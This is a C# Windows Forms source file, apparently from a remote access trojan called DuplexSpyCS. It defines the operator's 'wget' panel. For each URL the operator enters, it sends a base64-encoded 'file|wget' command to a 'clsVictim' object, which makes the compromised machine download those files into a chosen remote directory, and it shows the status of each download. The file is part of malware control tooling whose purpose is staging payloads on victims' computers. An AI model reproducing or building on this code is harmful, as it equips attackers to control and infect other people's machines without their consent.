using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmFileWGET : Form
    {
        public clsVictim v;
        public string szCurrentDir = null;

        public frmFileWGET()
        {
            InitializeComponent();
        }

        public void Update(string szUrl, string szRemoteFileName, string msg)
        {
            Invoke(new Action(() =>
            {
                try
                {
                    ListViewItem item = listView1.Items.Cast<ListViewItem>().Where(x => string.Equals(x.Text, szUrl, StringComparison.OrdinalIgnoreCase)).First();

                    if (item.SubItems[2].Text != "OK")
                    {
                        item.SubItems[1].Text = szRemoteFileName;
                        item.SubItems[2].Text = msg;

                        item.Tag = szRemoteFileName;
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }));
        }

        void setup()
        {
            listView1.FullRowSelect = true;
            textBox1.Text = $"http://url1{Environment.NewLine}http://url2";
            toolStripStatusLabel1.Text = "Welcome";
        }

        private void frmFileWGET_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            tabControl1.SelectedIndex = 1;
            listView1.Items.Clear();
            foreach (string line in textBox1.Lines.Where(x => !string.IsNullOrEmpty(x)).ToArray())
            {
                ListViewItem item = new ListViewItem(line);
                item.SubItems.Add(string.Empty);
                item.SubItems.Add(string.Empty);

                listView1.Items.Add(item);

                v.SendCommand($"file|wget|{clsCrypto.b64E2Str(line)}|{clsCrypto.b64E2Str(szCurrentDir)}");
            }

            toolStripStatusLabel1.Text = $"URL[{listView1.Items.Count}]";
        }

        //Show full path
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.SubItems[1].Text = item.Tag.ToString();
        }
        //Show file name
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.SubItems[1].Text = Path.GetFileName(item.Tag.ToString());
        }
    }
}
